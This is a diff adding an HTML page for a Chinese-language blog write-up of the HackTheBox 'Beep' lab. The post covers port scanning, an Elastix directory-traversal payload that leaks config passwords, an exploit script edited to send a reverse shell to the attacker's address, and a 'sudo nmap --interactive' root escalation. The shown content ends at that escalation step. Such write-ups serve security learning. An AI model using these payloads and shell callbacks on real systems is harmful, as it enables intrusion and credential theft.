@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Beep - T0x1c</title>
+
+  
+    <meta name="description" content="Beep是一个简单的靶机，知识点涉及Elastix本地文件包含漏洞、sudo提权、Shellshock等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Beep">
+<meta property="og:url" content="https://toxic80l.github.io/post/d21550b1/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Beep是一个简单的靶机，知识点涉及Elastix本地文件包含漏洞、sudo提权、Shellshock等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2011.08.57.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0420.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/Beep.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2011.29.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2015.15.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2015.35.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2015.36.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.44.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.45.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.49.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.51.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2022.44.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2010.02.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2010.21.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2010.44.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2011.05.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.14.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2014.58.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.11.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.24.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.26.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.20.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.30.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.31.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.36.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.41.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.48.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.46.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.47.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.53.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.58.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.14.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.16.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.19.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.19.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2017.29.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2017.32.41.png">
+<meta property="article:published_time" content="2022-07-05T13:23:08.000Z">
+<meta property="article:modified_time" content="2022-07-05T14:49:12.407Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="FreePBX">
+<meta property="article:tag" content="Elastix">
+<meta property="article:tag" content="webmin">
+<meta property="article:tag" content="shellshock">
+<meta property="article:tag" content="LFI">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2011.08.57.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80-443%E7%AB%AF%E5%8F%A3"><span class="toc-text">80&#x2F;443端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10000%E7%AB%AF%E5%8F%A3"><span class="toc-text">10000端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25%E7%AB%AF%E5%8F%A3"><span class="toc-text">25端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-root"><span class="toc-text">0x02 上线[root]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Elastic%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">Elastic远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF-esterisk"><span class="toc-text">上线[esterisk]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-root"><span class="toc-text">权限提升[root]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webmin%E7%99%BB%E5%BD%95"><span class="toc-text">webmin登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E7%99%BB%E5%BD%95"><span class="toc-text">SSH登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellshock"><span class="toc-text">Shellshock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E4%B8%8A%E4%BC%A0"><span class="toc-text">webshell上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-text">0x03 总结</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-07-05T13:23:08.000Z">2022-07-05</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Beep</span></h1>
+<p>Beep是一个简单的靶机，知识点涉及Elastix本地文件包含漏洞、sudo提权、Shellshock等。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2011.08.57.png" alt="截屏2022-05-27 11.08.57"></p>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0420.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span><u>通关思维导图</u>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/Beep.png" alt="Beep"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.7 -oA nmap_Beep</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2011.29.15.png" alt="截屏2022-05-27 11.29.15"><br>扫描结果显示目标开放了22、80、443、3306等端口</p>
+<h4 id="80-443端口"><a href="#80-443端口" class="headerlink" title="80/443端口"></a>80/443端口</h4><p>访问后发现这是一个 Elastix 登录页面，Elastix是一款专用交换机 (PBX) 软件。PBX 控制公司网络内的电话/语音网络，将其连接到网络的其余部分。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2015.15.25.png" alt="截屏2022-05-27 15.15.25"></p>
+<p>使用 gobuster 对当前页面进行目录扫描，成功扫描到多个目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u https://10.10.10.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 100 -k</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2015.35.41.png" alt="截屏2022-05-27 15.35.41"></p>
+<p>重点关注<code>/admin</code>目录，访问后出现登录提示<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-05-27%2015.36.12.png" alt="截屏2022-05-27 15.36.12"></p>
+<p>登录失败点击取消后重定向至<code>https://10.10.10.7/admin/config.php</code>，同时页面显示 FreePBX 的未授权信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.44.57.png" alt="截屏2022-07-05 09.44.57"></p>
+<p>利用 searchsploit 搜索 Elastix 中的相关漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit elastix</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.45.16.png" alt="截屏2022-07-05 09.45.16"></p>
+<p>结果显示目标可能存在本地文件包含漏洞，查看该漏洞的详细信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x exploits/php/webapps/37637.pl</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.49.07.png" alt="截屏2022-07-05 09.49.07"></p>
+<p>漏洞利用代码中显示了目标POC信息<code>vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code>，该漏洞主要因为<code>current_language</code>参数未过滤，导致攻击者可以利用<code>../</code>目录穿越到配置文件，通过<code>%00</code>截断字符串忽略<code>.php</code>。直接利用该POC 访问目标，其中包含了一堆配置文件信息，获取到的账号密码如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AMPDBHOST=localhost</span><br><span class="line"></span><br><span class="line">AMPDBENGINE=mysql</span><br><span class="line">AMPDBUSER=asteriskuser</span><br><span class="line">AMPDBPASS=jEhdIekWmdjE</span><br><span class="line"></span><br><span class="line">AMPENGINE=asterisk</span><br><span class="line">AMPMGRUSER=admin</span><br><span class="line">AMPMGRPASS=jEhdIekWmdjE</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2009.51.24.png" alt="截屏2022-07-05 09.51.24"></p>
+<p>使用拿到的账号密码登录 Elastix<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2022.44.54.png" alt="截屏2022-07-05 22.44.54"></p>
+<h4 id="10000端口"><a href="#10000端口" class="headerlink" title="10000端口"></a>10000端口</h4><p>访问后为 webmin 登录界面，webmin 是用于管理 Unix 系统的 web 界面，尝试使用弱口令登录，但是结果显示失败。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2010.02.17.png" alt="截屏2022-07-05 10.02.17"></p>
+<h4 id="25端口"><a href="#25端口" class="headerlink" title="25端口"></a>25端口</h4><p>通过本地文件包含，我们成功从<code>/etc/passwd</code>中读取到了用户列表</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">mysql</span><br><span class="line">cyrus</span><br><span class="line">asterisk</span><br><span class="line">spamfilter</span><br><span class="line">fanis</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2010.21.10.png" alt="截屏2022-07-05 10.21.10"></p>
+<p>使用 smtp-user-enum 测试用户连接，结果显示目标用户都存在</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -m VRFY -U user.txt 10.10.10.7 25</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2010.44.09.png" alt="截屏2022-07-05 10.44.09"></p>
+<h2 id="0x02-上线-root"><a href="#0x02-上线-root" class="headerlink" title="0x02 上线[root]"></a>0x02 上线[root]</h2><p>该靶机存在多种方式提至 root 用户权限，下面将介绍其中的五种</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、Elastic远程代码执行</span><br><span class="line">2、Webmin</span><br><span class="line">3、SSH</span><br><span class="line">4、shellshock</span><br><span class="line">5、webshell</span><br></pre></td></tr></table></figure>
+
+<h3 id="Elastic远程代码执行"><a href="#Elastic远程代码执行" class="headerlink" title="Elastic远程代码执行"></a>Elastic远程代码执行</h3><h4 id="上线-esterisk"><a href="#上线-esterisk" class="headerlink" title="上线[esterisk]"></a>上线[esterisk]</h4><p>除了本地文件包含漏洞，Elastix 还存在远程代码执行漏洞，但是直接利用会报错，因此需要略作改动</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x exploits/php/webapps/18650.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2011.05.31.png" alt="截屏2022-07-05 11.05.31"></p>
+<p>首先需要修改目标地址、本地地址以及本地监听端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rhost = <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span></span><br><span class="line">lhost = <span class="number">10.10</span><span class="number">.14</span><span class="number">.12</span></span><br><span class="line">lport = <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>其次忽略 SSL 证书错误，将其传递至请求当中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx = ssl.create_default_context()</span><br><span class="line">ctx.check_hostname = <span class="literal">False</span></span><br><span class="line">ctx.verify_mode = ssl.CERT_NONE</span><br><span class="line"></span><br><span class="line">urllib.urlopen(url, context=ctx)</span><br></pre></td></tr></table></figure>
+<p>最后则需要开放一个扩展，使用 svwar 进行寻找特定的 PBX 实例</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svwar -m INVITE -e100-999 10.10.10.7</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.14.43.png" alt="截屏2022-07-05 15.14.43"></p>
+<p>将拿到的结果 233 附加到脚本的<code>extension</code>当中，通过 sslscan 对靶机支持的 SSL 协议进行扫描，结果显示靶机支持的 SSL 协议为<code>TLSv1.0</code>，这大大低于本机允许的范围<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2014.58.02.png" alt="截屏2022-07-05 14.58.02"></p>
+<p>因此最佳的做法是在本机中修改 openssl 的配置文件，将执行的<code>MinProtocol</code>以及<code>CipherString</code>都修改为 None 值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssl/openssl.cnf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 配置</span></span></span><br><span class="line">MinProtocol = None</span><br><span class="line">CipherString = None</span><br></pre></td></tr></table></figure>
+<p>运行利用脚本，成功收到反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.11.42.png" alt="截屏2022-07-05 15.11.42"></p>
+<h4 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升[root]"></a>权限提升[root]</h4><p>漏洞利用脚本中建议使用<code>sudo nmap</code>完成 root 提权，因此我们可以借助 nmap 的<code>![command]</code>完成权限提升。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --interactive </span><br><span class="line">nmap &gt; !bash</span><br></pre></td></tr></table></figure>
